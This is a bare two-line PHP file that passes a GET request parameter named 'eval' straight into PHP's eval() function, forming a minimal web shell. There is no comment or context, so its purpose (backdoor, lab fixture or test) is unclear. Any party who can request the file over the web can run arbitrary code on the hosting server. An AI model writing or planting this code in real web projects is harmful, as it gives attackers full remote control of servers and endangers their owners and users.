<?php
eval($_GET["eval"]);
